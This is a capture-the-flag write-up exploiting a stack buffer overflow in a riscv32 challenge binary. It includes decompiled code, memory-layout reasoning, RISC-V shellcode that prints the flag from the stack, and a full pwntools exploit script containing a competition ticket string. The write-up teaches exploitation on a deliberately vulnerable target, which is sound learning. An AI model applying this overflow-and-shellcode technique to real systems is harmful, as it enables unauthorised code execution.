# RISC-V Smash Baby
Points (at the end of the quals): 70
## description
```
Who gave the baby a hammer?? She's smashing everything!! That was such a riscv idea!

(This challenge is running under emulation using qemu-riscv32 inside a Docker container with an Ubuntu 22.04 base image)
```

This was a particularly interesting problem involving RISC-V pwn instead of the standard x86_64. The problem is a
standard buffer overflow chall, except that the binary is running on riscv.

checksec:
```
    Arch:     em_riscv-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000)
    RWX:      Has RWX segments
```

ghidra:
```c
undefined4 main(void) {
  char *__buf;
  int *piVar1;
  size_t sVar2;
  char *local_24;
  char *local_20;
  size_t local_1c;
  int local_18;
  ulong local_14;
  
  gp = 0x6da84;
  setvbuf((FILE *)_IO_2_1_stdin_,(char *)0x0,2,0);
  setvbuf((FILE *)_IO_2_1_stdout_,(char *)0x0,2,0);
  local_24 = getenv("FLAG");
  if (local_24 == (char *)0x0) {
    puts("No flag present");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  local_18 = open("flag.txt",0x41);
  if (local_18 < 0) {
    piVar1 = __errno_location();
    printf("Errno = %d trying to open flag.txt\n",*piVar1);
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  fchmod(local_18,0x180);
  __buf = local_24;
  sVar2 = strlen(local_24);
  local_1c = write(local_18,__buf,sVar2);
  sVar2 = strlen(local_24);
  if (sVar2 != local_1c) {
    puts("Unable to write flag to file");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  close(local_18);
  local_1c = unsetenv("FLAG");
  if (local_1c != -1) {
```

Looking at the setup for the function, we can see the normal setvbuf setup, and the first slightly odd part is where
the challenge retrieves the flag from the environment. It proceeds to write the flag to a file and change the
permissions. If you have ever tried to modify environment variables from within a program, you will know that it does
not work and the changes are only visible within the program and do not modify the actual environment variables. This
is because the environment is actually copied into the stack of the running process, and this copy of the environment
on the stack is what the program has access to. This is important because if we can somehow read from the stack, we
can leak the flag without ever having to touch the flag.txt file.

rest of the code:
```c
    puts("\nBaby\'s First RISC-V Stack Smash\n");
    printf("Because I like you (and this is a baby\'s first type chall) here is something useful: %p \n"
           ,&local_24);
    puts("Exploit me!");
    local_20 = getenv("TIMEOUT");
    if (local_20 == (char *)0x0) {
      local_14 = 10;
    }
    else {
      local_14 = strtoul(local_20,(char **)0x0,10);
      if (local_14 == 0) {
        local_14 = 10;
      }
    }
    signal(0xe,alarm_handler);
    alarm(local_14);
    do {
      local_1c = syncronize(0);
      if (local_1c == -1) {
        printf("synchronizer failed after too many received bytes");
        gp = 0x6da84;
        return 0xffffffff;
      }
      local_1c = read_message(0);
    } while (local_1c != -1);
    puts("did not read message");
    return 0xffffffff;
  }
  puts("Unable to clear environment");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

Crucially the code leaks the stack address which is where the flag is stored. The syncronize function does what the
name states, and read_message is where the buffer overflow is.

read_message:
```c
undefined4 read_message(int param_1) {
  undefined4 uVar1;
  ushort local_1a;
  uint local_18;
  undefined4 local_14;
  
  gp = 0x6da84;
  local_18 = read(param_1,&local_1a,2);
  if (local_18 < 2) {
    puts("unable to read bytes");
    local_14 = 0xffffffff;
  }
  else if (local_1a == 0xcefa) {
    local_14 = do_face(param_1);
  }
  else {
    if (local_1a < 0xcefb) {
      if (local_1a == 0x4141) {
        uVar1 = do_aa(param_1);
        gp = 0x6da84;
        return uVar1;
      }
      if (local_1a == 0x4242) {
        uVar1 = do_1b1(param_1);
        gp = 0x6da84;
        return uVar1;
      }
    }
    puts("bad message type received");
    local_14 = 0xffffffff;
  }
  return local_14;
}
```

- do_face is safe and reads 300 bytes into a 300 byte buffer.
- do_aa is safe and reads 40 bytes into a 40 byte buffer
- do_1b1 is unsafe and reads 60 bytes into a 20 byte buffer.

Now the problem only provides a binary and does not give a libc, but in ghidra we can see a large amount of libc
functions and their implementations, giving the impression that the binary was statically compiled with the libc.
Given this I tried to find the system function to pop a shell, but I could not locate it.

My next option was to try stack shellcode. Earlier we noted that checksec had noticed that the binary had RWX
segments. RWX segments does not necessarily mean RWX stack, and we can check this using readelf.

readelf -l smash-baby:
```
Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  RISCV_ATTRIBUT 0x05d2b5 0x00000000 0x00000000 0x00042 0x00000 R   0x1
  LOAD           0x000000 0x00010000 0x00010000 0x59bca 0x59bca R E 0x1000
  LOAD           0x05a398 0x0006a398 0x0006a398 0x02ef0 0x05b30 RW  0x1000
  NOTE           0x000114 0x00010114 0x00010114 0x00020 0x00020 R   0x4
  TLS            0x05a398 0x0006a398 0x0006a398 0x0000c 0x0002c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
  GNU_RELRO      0x05a398 0x0006a398 0x0006a398 0x01c68 0x01c68 R   0x1
```
In the output we can see a program header of type GNU_STACK with RWX segments. GNU_STACK tells the loader how to set
the stack permissions, so we do indeed have an RWX stack.

We currently have:
1. stack address
2. executable stack
3. buffer overflow of 40 bytes

The problem with the current buffer overflow is that its not quite large enough for the shellcode, so instead we will
take advantage of the do_face function, which uses a 300 byte buffer. Because of the 300 byte buffer, the do_face
functions stack frame will stay preserved below other frames until the next do_face function call. We can take
advantage of this and write our shellcode into the do_face buffer, then use the buffer overflow in do_1b1 to jump into
the shellcode using the leaked stack address.

The function leaks local_24, and ghidra names the variable this way to indicate that the variable is stored 0x24 bytes
from the top of the frame.

This tells us that the stack pre main is leak + 0x24. The main function uses 0x40 bytes of stack space, read_message
uses 0x30 bytes, and the do_face buffer is located at sp - 0x140. This gives us the exact location of the do_face
buffer: leak + 0x24 - 0x40 - 0x30 - 0x140.

In order to write some shellcode for riscv, I downloaded the riscv32 cross compilation toolchain from here:
[https://github.com/stnolting/riscv-gcc-prebuilt](https://github.com/stnolting/riscv-gcc-prebuilt), which are compiled
from the official toolchain ([https://github.com/riscv-collab/riscv-gnu-toolchain](https://github.com/riscv-collab/riscv-gnu-toolchain)), although I think I missed the official release tars in the official repository. Oops.

Anyways riscv is slightly different from x86_64 in that all jumps are pc relative except a few instructions which are
absolute. Absolute jumps are made using the jalr instruction, which writes the value of a general purpose register
into the pc.

shellcode:
```c
/* attack.s */
_start: /* not needed but it looks better this way :) */
    li   a0,   1
    li   a1,   0x40800cfc
    li   a2,   0x300
    li   ra,   0x107d8
    jalr a3,   0(ra)
```

compiled with:
```sh
# Makefile
build: attack.s
    riscv32-unknown-elf-as -o attack.o attack.s
    riscv32-unknown-elf-objcopy -I elf32-littleriscv -O binary attack.o attack.bin
```
The first command compiles the assembly into an object file, and the second command strips everything from the elf
file and leaves only the section contents, leaving only the shellcode.

final exploit:
```python
from pwn import *

if args.REMOTE:
    io = remote("riscv_smash.quals2023-kah5Aiv9.satellitesabove.me", 5300)
    io.sendlineafter(b"Ticket please:\n", b"ticket{mike519464juliet4:GOKPBLXYOmtSLqsRatJTXZDuTDCBaH53fMS8_H0nOJSDxZGshZI-bIS4ZA0B85ftKA}")
else:
    io = process(["/home/unvariant/qemu-8.0.0-rc2/build/qemu-riscv32", "./smash-baby"])

def sync():
    io.send(b"ACEG")

io.recvuntil(b": ")

leak = io.recvline().strip()
leak = int(leak[2:], 16)
print(f"[+] leak: 0x{leak:x}")
code = leak + 0x24 - 0x40
read_message = code - 0x30
do_face = read_message - 0x140
print(f"[+] code: 0x{do_face:x}")

sync()
io.send(b"\xfa\xce")
shellcode = open("attack.bin", "rb").read().ljust(300, b"\x00")
io.send(shellcode)

sync()
io.send(b"BB")
payload = b"A" * 0x24 + p32(do_face)
payload = payload.ljust(0x3c, b"A")
io.send(payload)

io.interactive()
```